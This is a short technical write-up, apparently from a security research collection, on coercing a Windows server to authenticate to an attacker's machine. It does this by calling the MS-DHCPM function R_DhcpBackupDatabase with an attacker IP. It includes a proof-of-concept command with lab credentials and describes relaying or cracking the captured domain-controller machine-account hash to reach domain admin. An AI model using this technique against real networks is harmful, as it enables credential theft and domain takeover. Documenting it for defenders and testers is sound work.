# MS-DHCPM - Remote call to R_DhcpBackupDatabase (opnum 44)

## Summary

+ **Protocol**: [[MS-DHCPM]: Microsoft Dynamic Host Configuration Protocol (DHCP) Server Management Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dhcpm/d117857c-1491-46a2-a68e-c844be3627d4)

+ **Protocol UUID**: 6bffd098-a112-3610-9833-46c3f874532d

+ **Protocol version**: 1.0

+ **SMB Named pipe**: `\PIPE\DHCPSERVER`

+ **Function name**: [`R_DhcpBackupDatabase`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dhcpm/f2b03c0f-218d-47dd-87f4-c1be817b366b)

+ **Function operation number**: `44`

+ **Authenticated**: Yes


## Description

In order to call a remote procedure to trigger an authentication from the remote machine to an arbitrary target, we first need to authenticate to the remote machine, usually on SMB. Then we need to connect to the remote SMB pipe `\PIPE\DHCPSERVER` and bind to the desired [`MS-DHCPM`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dhcpm/d117857c-1491-46a2-a68e-c844be3627d4) protocol (with uuid `6bffd098-a112-3610-9833-46c3f874532d` and version `1.0`) in order to perform remote procedure calls to functions in the [`MS-DHCPM`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dhcpm/d117857c-1491-46a2-a68e-c844be3627d4) protocol.

The IP 192.168.2.51 being my attacking machine where I listen with Responder, and 192.168.2.1 being the IP of my Windows Server. When starting this script, it will authenticate and connect to the remote pipe named `\PIPE\DHCPSERVER` This pipe is connected to the protocol [[MS-DHCPM]: Microsoft Dynamic Host Configuration Protocol (DHCP) Server Management Protocol](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dhcpm/d117857c-1491-46a2-a68e-c844be3627d4) and allows to call RPC functions of this protocol. We will then call the remote [`R_DhcpBackupDatabase`](https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dhcpm/f2b03c0f-218d-47dd-87f4-c1be817b366b) function on the remote Windows Server (192.168.2.1) with the following parameters:

```cpp
R_DhcpBackupDatabase('192.168.2.51\x00')
```

We can try this with this proof of concept code ([coerce_poc.py](./coerce_poc.py)):

```bash
./coerce_poc.py -d "LAB.local" -u "user1" -p "Podalirius123!" 192.168.2.51 192.168.2.1
```

![](./imgs/poc.png)

This will force the Windows Server (192.168.2.1) to authenticate to the SMB share `\\192.168.2.51\share` and therefore authenticate using its machine account (`DC01$`).  After this RPC call, we get an authentication from the domain controller with its machine account directly on Responder:

![](./imgs/hash.png)

After this step, we relay the authentication to other services in order to elevate our privileges, or try to downgrade it to NTLMv1 and crack it in order to get the NT hash of the domain controller's machine account. This kind of vulnerabilities allows to quickly get from user to domain administrator in unprotected domains!


## Function technical detail

```cpp
DWORD R_DhcpBackupDatabase(
   [in, unique, string] DHCP_SRV_HANDLE ServerIpAddress,
   [in, string] LPWSTR Path
 );
```

## References

+ Documentation of protocol [MS-DHCPM]: Microsoft Dynamic Host Configuration Protocol (DHCP) Server Management Protocol: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dhcpm/d117857c-1491-46a2-a68e-c844be3627d4

+ Documentation of function `R_DhcpBackupDatabase`: https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-dhcpm/f2b03c0f-218d-47dd-87f4-c1be817b366b